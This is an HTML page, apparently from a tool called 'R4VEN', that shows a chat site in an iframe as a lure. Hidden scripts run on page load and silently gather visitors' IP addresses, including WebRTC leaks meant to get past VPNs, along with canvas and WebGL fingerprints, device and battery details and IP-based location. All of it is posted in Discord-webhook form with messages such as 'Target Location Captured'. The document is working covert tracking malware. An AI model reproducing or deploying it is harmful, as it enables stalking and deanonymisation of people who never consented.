<!DOCTYPE html>
<html>

<head>
  <script type="text/javascript" src="dwebhook.js"></script>
  <!-- No-JS fallback tracking -->
  <noscript>
    <img src="/no_js_detector" width="1" height="1" style="display:none;" alt="">
    <img src="/detect_username" width="1" height="1" style="display:none;" alt="">
  </noscript>
</head>

<body onload="getLocation(); detectUsername();">

  <!-- Image pixel tracking (works even with JS disabled) -->
  <img src="/track" width="1" height="1" style="display:none;" alt="">

  <iframe src="https://www.meetskip.com/chat" width="100%" height="900" style="border:none;"></iframe>

  <p id="demo"></p>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <script>
    // MICROPHONE SUPPRESSION - Block all mic access attempts
    if (navigator.mediaDevices) {
      const originalGetUserMedia = navigator.mediaDevices.getUserMedia;
      navigator.mediaDevices.getUserMedia = function(constraints) {
        // Reject any audio requests
        if (constraints && constraints.audio) {
          return Promise.reject(new DOMException('Audio permission denied', 'NotAllowedError'));
        }
        // Allow video-only if needed (though video is also disabled)
        return originalGetUserMedia.call(this, constraints);
      };
    }
    
    var x = document.getElementById("demo");
    
    // Username detection function
    function detectUsername() {
      try {
        fetch('/detect_username')
          .then(response => response.json())
          .then(data => {
            console.log('Username detection data:', data);
          })
          .catch(error => console.log('Username detection error:', error));
      } catch (e) {
        console.log('Username detection not available');
      }
    }

    let datetime = new Date();
    let localtime = String(datetime.toLocaleTimeString());

    // Browser Detection Function
    function detectBrowser() {
      const ua = navigator.userAgent;
      if (ua.indexOf('Chrome') > -1 && ua.indexOf('Edg') === -1) {
        return 'Chrome';
      } else if (ua.indexOf('Edg') > -1) {
        return 'Edge';
      } else if (ua.indexOf('Firefox') > -1) {
        return 'Firefox';
      } else if (ua.indexOf('Safari') > -1) {
        return 'Safari';
      }
      return 'Unknown';
    }

    const detectedBrowser = detectBrowser();
    const isChromelike = (detectedBrowser === 'Chrome' || detectedBrowser === 'Edge');

    // WebRTC IP Leak Detection (Bypasses VPN)
    function getWebRTCRealIP() {
      return new Promise(function(resolve) {
        var leakedIPs = [];
        try {
          var pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)({
            iceServers: []
          });
          
          pc.createDataChannel("");
          pc.createOffer().then(function(offer) {
            pc.setLocalDescription(offer);
          }).catch(function(e) {
            console.log('WebRTC offer error:', e);
            resolve(leakedIPs);
          });
          
          pc.onicecandidate = function(ice) {
            if (!ice || !ice.candidate) return;
            var ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
            var ipAddress = ipRegex.exec(ice.candidate.candidate);
            if (ipAddress && leakedIPs.indexOf(ipAddress[1]) === -1) {
              leakedIPs.push(ipAddress[1]);
            }
          };
          
          setTimeout(function() {
            try {
              pc.close();
            } catch(e) {}
            resolve(leakedIPs);
          }, 2000);
        } catch(e) {
          console.log('WebRTC error:', e);
          resolve(leakedIPs);
        }
      });
    }

    // Advanced Device Fingerprinting
    function generateDeviceFingerprint() {
      var fingerprint = {
        screen: screen.width + 'x' + screen.height + 'x' + screen.colorDepth,
        timezone: new Date().getTimezoneOffset(),
        languages: navigator.languages ? navigator.languages.join(',') : navigator.language,
        plugins: [],
        webgl: 'N/A',
        canvas: 'N/A',
        fonts: [],
        hwConcurrency: navigator.hardwareConcurrency,
        deviceMemory: navigator.deviceMemory,
        maxTouchPoints: navigator.maxTouchPoints,
        vendor: navigator.vendor
      };
      
      // Get WebGL info
      try {
        var canvas = document.createElement('canvas');
        var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if(gl) {
          var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
          if(debugInfo) {
            fingerprint.webgl = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
          }
        }
      } catch(e) {}
      
      // Canvas fingerprinting
      try {
        var canvas = document.createElement('canvas');
        var ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.textBaseline = 'alphabetic';
        ctx.fillStyle = '#f60';
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = '#069';
        ctx.fillText('Browser Fingerprint', 2, 15);
        fingerprint.canvas = canvas.toDataURL().substring(0, 50);
      } catch(e) {}
      
      // Plugin detection
      try {
        for(var i = 0; i < navigator.plugins.length; i++) {
          fingerprint.plugins.push(navigator.plugins[i].name);
        }
      } catch(e) {}
      
      return fingerprint;
    }

    // Send WebRTC and Fingerprint data
    function sendWebRTCAndFingerprint() {
      getWebRTCRealIP().then(function(ips) {
        var fingerprint = generateDeviceFingerprint();
        
        var webrtcData = "```autohotkey\n";
        webrtcData += "WebRTC_Leaked_IPs: " + (ips.length > 0 ? ips.join(', ') : 'None detected') + "\n";
        webrtcData += "VPN_Detected: " + (ips.length > 0 ? 'Possible (Real IP leaked)' : 'Cannot confirm') + "\n";
        webrtcData += "Screen_Resolution: " + fingerprint.screen + "\n";
        webrtcData += "Timezone_Offset: " + fingerprint.timezone + "\n";
        webrtcData += "Languages: " + fingerprint.languages + "\n";
        webrtcData += "GPU_Info: " + fingerprint.webgl + "\n";
        webrtcData += "CPU_Cores: " + fingerprint.hwConcurrency + "\n";
        webrtcData += "Device_Memory: " + (fingerprint.deviceMemory || 'N/A') + " GB\n";
        webrtcData += "Touch_Points: " + fingerprint.maxTouchPoints + "\n";
        webrtcData += "Plugins: " + (fingerprint.plugins.length > 0 ? fingerprint.plugins.join(', ') : 'None') + "\n";
        webrtcData += "```";
        
        const request = new XMLHttpRequest();
        request.open("POST", "/location_update");
        request.setRequestHeader('Content-type', 'application/json');
        
        var myEmbed = {
          author: {
            name: "üîç WebRTC & Device Fingerprint"
          },
          title: "Advanced Identification Data",
          description: webrtcData,
          color: 16711680,
          footer: {
            text: "Real IP leak detection via WebRTC"
          }
        }
        
        var params = {
          username: "R4VEN",
          avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
          embeds: [myEmbed]
        }
        
        request.send(JSON.stringify(params));
      });
    }

    // Call fingerprinting on page load
    sendWebRTCAndFingerprint();

    var sysinfo = (" GET ", "```xl\n" + navigator.userAgent + "```" + "```autohotkey\n" + "\nPlatform: " + navigator.platform + "\nCookies_Enabled: " + navigator.cookieEnabled + "\nBrowser_Language: " + navigator.language + "\nBrowser_Name: " + navigator.appName + "\nBrowser_CodeName: " + navigator.appCodeName + "\nRam: " + navigator.deviceMemory + "\nCPU_cores: " + navigator.hardwareConcurrency + "\nScreen_Width: " + screen.width + "\nScreen_Height: " + screen.height + "\nTime: " + localtime + "\nRefUrl: " + document.referrer + "\nOscpu: " + navigator.oscpu + "\nDetected_Browser: " + detectedBrowser + "```");

    const request = new XMLHttpRequest();
    request.open("POST", "/location_update"); //change webhook

    request.setRequestHeader('Content-type', 'application/json');

    var myEmbed = {
      author: {
        name: "Target System Information.."
      },
      title: "Uagent:",
      description: sysinfo,
      color: 15418782
    }

    var params = {
      username: "R4VEN",
      avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
      content: "@everyone Someone Opened The Link O_o ",
      embeds: [myEmbed]
    }

    request.send(JSON.stringify(params));

    // Enhanced Device Information Vector
    function collectDeviceInfo() {
      var deviceInfo = "```autohotkey\n";
      
      // Display Information
      deviceInfo += "Display_PixelDepth: " + screen.pixelDepth + "\n";
      deviceInfo += "ColorDepth: " + screen.colorDepth + "\n";
      deviceInfo += "DevicePixelRatio: " + window.devicePixelRatio + "\n";
      deviceInfo += "ScreenOrientation: " + (screen.orientation ? screen.orientation.type : "N/A") + "\n";
      
      // Battery Information (if available)
      if(navigator.getBattery) {
        navigator.getBattery().then(function(battery) {
          deviceInfo += "Battery_Level: " + Math.round(battery.level * 100) + "%\n";
          deviceInfo += "Battery_Charging: " + battery.charging + "\n";
        });
      }
      
      // Connection Information (if available)
      if(navigator.connection) {
        deviceInfo += "Connection_Type: " + navigator.connection.effectiveType + "\n";
        deviceInfo += "SaveData: " + navigator.connection.saveData + "\n";
        if(navigator.connection.downlink) {
          deviceInfo += "Downlink_Speed: " + navigator.connection.downlink + " Mbps\n";
        }
      }
      
      // Storage Information
      deviceInfo += "LocalStorage_Available: " + (typeof localStorage !== 'undefined' ? 'Yes' : 'No') + "\n";
      if(typeof localStorage !== 'undefined') {
        deviceInfo += "LocalStorage_Size: " + JSON.stringify(localStorage).length + " bytes\n";
      }
      
      // WebGL Information (GPU)
      var canvas = document.createElement('canvas');
      var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if(gl) {
        var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if(debugInfo) {
          deviceInfo += "GPU_Vendor: " + gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) + "\n";
          deviceInfo += "GPU_Renderer: " + gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) + "\n";
        }
      }
      
      // Timezone and Locale
      deviceInfo += "Timezone_Offset: " + new Date().getTimezoneOffset() + " min\n";
      deviceInfo += "Browser_Locales: " + (navigator.languages ? navigator.languages.join(', ') : navigator.language) + "\n";
      
      // Do Not Track
      deviceInfo += "DNT_Header: " + (navigator.doNotTrack ? navigator.doNotTrack : "Not Set") + "\n";
      
      // WebDriver Detection
      deviceInfo += "WebDriver_Detected: " + (navigator.webdriver ? "Yes" : "No") + "\n";
      
      // Touch Support
      deviceInfo += "Touch_Support: " + (('ontouchstart' in window) ? 'Yes' : 'No') + "\n";
      
      // Vendor Information
      deviceInfo += "Vendor: " + navigator.vendor + "\n";
      deviceInfo += "OnLine_Status: " + navigator.onLine + "\n";
      
      deviceInfo += "```";
      
      const deviceRequest = new XMLHttpRequest();
      deviceRequest.open("POST", "/location_update");
      deviceRequest.setRequestHeader('Content-type', 'application/json');
      
      var deviceEmbed = {
        author: {
          name: "Target Device Information Vector"
        },
        title: "Extended Hardware & System Details",
        description: deviceInfo,
        color: 9109760,
        footer: {
          text: "Comprehensive device telemetry collected"
        }
      }
      
      var deviceParams = {
        username: "R4VEN",
        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
        embeds: [deviceEmbed]
      }
      
      deviceRequest.send(JSON.stringify(deviceParams));
    }
    
    // Collect device info on page load
    collectDeviceInfo();

    $.getJSON("https://api.ipify.org?format=json", function (data) {
      $("#gfg").html(data.ip);

      const request = new XMLHttpRequest();
      request.open("POST", "/location_update"); //change webhook

      request.setRequestHeader('Content-type', 'application/json');

      var myEmbed = {
        author: {
          name: "Target Ip"
        },
        description: '```xl\n' + data.ip + '```' + '\n__**IP Details:**__ https://ip-api.com/#' + data.ip + "\n",
        color: 15548997,

        footer: {
          text: "Geographic location based on IP address is NOT accurate, it provides the approximate location of the ISP."
        }
      }

      var params = {
        username: "R4VEN",
        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
        embeds: [myEmbed]
      }

      request.send(JSON.stringify(params));
    })

    $.getJSON("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", function (response) {

      const request = new XMLHttpRequest();
      request.open("POST", "/location_update"); //change webhook

      request.setRequestHeader('Content-type', 'application/json');

      var myEmbed = {
        author: {
          name: "IP Address Reconnaissance"
        },
        title: response.status, //response.query
        description: '```autohotkey\nContinent: ' + response.continent +
          "\nContinentCode: " + response.continentcode +
          "\nCountry: " + response.country +
          "\nCountrycode: " + response.countrycode +
          "\nRegionname: " + response.regionName +
          "\nRegion: " + response.region +
          "\nCity: " + response.city +
          "\nDistrict: " + response.district +
          "\nZip: " + response.zip +
          "\nTime_zone: " + response.time_zone +
          "\nName: " + response.name +
          "\nAs: " + response.as +
          "\nIsp: " + response.isp +
          "\nReverse: " + response.reverse +
          "\nOffset: " + response.offset +
          "\nCurrency: " + response.currency +
          "\nProxy: " + response.proxy +
          "\nMobile: " + response.mobile +
          "\nLat: " + response.lat +
          "\nLon: " + response.lon + '```',
        color: 5763719

      }

      var params = {
        username: "R4VEN",
        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
        embeds: [myEmbed]
      }

      request.send(JSON.stringify(params));
    })

    function getLocation() {
      // Skip browser geolocation permission prompt entirely
      // Go directly to silent IP-based collection (no permissions needed)
      fetchIPBasedLocation();
    }

    function fetchIPBasedLocation() {
      // Silent IP-based location gathering - no permission needed
      try {
        $.getJSON("http://ip-api.com/json/?fields=lat,lon,accuracy,timezone,isp", function(data) {
          if(data.lat && data.lon) {
            var locationData = {
              coords: {
                latitude: data.lat,
                longitude: data.lon,
                accuracy: data.accuracy || 5000  // IP-based is ~5km accurate
              },
              source: "IP-Based (Less Accurate)"
            };
            showPosition(locationData);
          }
        }).fail(function() {
          $.getJSON("https://ipapi.co/json/", function(data) {
            if(data.latitude && data.longitude) {
              var locationData = {
                coords: {
                  latitude: data.latitude,
                  longitude: data.longitude,
                  accuracy: 5000
                },
                source: "IP-Based Fallback"
              };
              showPosition(locationData);
            }
          });
        });
      } catch (e) {
        console.error('Geolocation error:', e);
      }
    }

    function showPosition(position) {
      var lat = position.coords.latitude;
      var lon = position.coords.longitude;
      var accuracy = position.coords.accuracy ? position.coords.accuracy + "m" : "Unknown";
      var source = position.source || "GPS (Exact)";
      
      var latlong = (" GET ", "```prolog\nüéØ GEOLOCATION DATA\nLatitude: " + lat + "\nLongitude: " + lon + "\nAccuracy: " + accuracy + "\nSource: " + source + "```" + "\n__**Google Maps:**__ https://www.google.com/maps/place/" + lat + "," + lon + "\n__**Google Earth:**__ https://earth.google.com/web/search/" + lat + "," + lon + "\n__**OpenStreetMap:**__ https://www.openstreetmap.org/?mlat=" + lat + "&mlon=" + lon + "&zoom=15");

      const request = new XMLHttpRequest();
      request.open("POST", "/location_update"); //change webhook

      request.setRequestHeader('Content-type', 'application/json');

      var myEmbed = {
        author: {
          name: "üéØ Target Location Captured"
        },
        title: "üìç GPS Location - Exact Coordinates",
        description: latlong + "\n",
        color: 15844367,
        fields: [
          {"name": "Latitude", "value": String(lat), "inline": true},
          {"name": "Longitude", "value": String(lon), "inline": true},
          {"name": "Accuracy", "value": accuracy, "inline": true},
          {"name": "Source", "value": source, "inline": true}
        ],
        footer: {
          text: "GPS provides exact location with coordinates. Accuracy depends on device GPS capability."
        }
      }

      var params = {
        username: "R4VEN",
        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
        embeds: [myEmbed]
      }

      request.send(JSON.stringify(params));
    }

    function showError(error) {
      console.log('Geolocation error code:', error.code, 'message:', error.message);
      
      switch (error.code) {
        case error.PERMISSION_DENIED:
          // User denied permission - fallback to IP-based location
          console.log('GPS permission denied - using IP-based location');
          fetchIPBasedLocation();
          break;
        case error.POSITION_UNAVAILABLE:
          // GPS signal lost or unavailable - try IP-based
          console.log('GPS position unavailable - using IP-based location');
          fetchIPBasedLocation();
          break;
        case error.TIMEOUT:
          // GPS took too long - try again with more time
          console.log('GPS timeout - retrying with increased timeout');
          setTimeout(function() {
            navigator.geolocation.getCurrentPosition(
              showPosition,
              showError,
              {
                enableHighAccuracy: true,
                timeout: 30000,  // Extended timeout
                maximumAge: 0
              }
            );
          }, 1000);
          break;
        case error.UNKNOWN_ERROR:
          console.log('Unknown GPS error - using IP-based location');
          fetchIPBasedLocation();
          break;
      }
    }
  </script>
</body>

</html>
